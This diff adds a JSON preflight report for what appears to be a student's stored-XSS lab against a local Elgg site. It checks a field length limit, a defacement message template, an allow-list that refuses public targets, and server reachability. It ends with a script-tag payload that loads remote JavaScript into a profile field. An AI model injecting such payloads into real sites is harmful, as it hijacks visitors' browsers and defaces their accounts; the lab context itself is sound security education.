@@ -1,0 +1,50 @@
+{
+  "generated": "2026-11-18T11:03:22",
+  "elgg_url": "http://www.seed-server.com",
+  "js_base": "http://127.0.0.1:8000",
+  "checks": [
+    {
+      "name": "Brief Description limit configured",
+      "ok": true,
+      "detail": "limit = 250 chars"
+    },
+    {
+      "name": "Profile message is a template (no hard-coded MSV)",
+      "ok": true,
+      "detail": "'Tài khoản này đã bị Hack bởi <MSV>'"
+    },
+    {
+      "name": "Allow-list permits the local lab target",
+      "ok": true,
+      "detail": "http://127.0.0.1:8000 -> host is in the explicit allow-list"
+    },
+    {
+      "name": "Allow-list refuses a public target",
+      "ok": true,
+      "detail": "http://example.com/ -> host is NOT a configured lab target (public/out-of-scope targets are refused)"
+    },
+    {
+      "name": "Local demo.js resource exists",
+      "ok": true,
+      "detail": "/home/thang/Documents/hus-k68-khmt/CompSec/src/js_server/demo.js"
+    },
+    {
+      "name": "JS server /health reachable",
+      "ok": true,
+      "detail": "HTTP 200"
+    },
+    {
+      "name": "JS server serves demo.js",
+      "ok": true,
+      "detail": "HTTP 200"
+    },
+    {
+      "name": "Elgg application reachable",
+      "ok": true,
+      "detail": "http://10.9.0.5/ (Host: www.seed-server.com) -> HTTP 200, Elgg page confirmed"
+    }
+  ],
+  "payload_sample": "<script src=\"http://localhost:8000/demo.js\"></script>",
+  "payload_chars": 53,
+  "payload_within_limit": true
+}
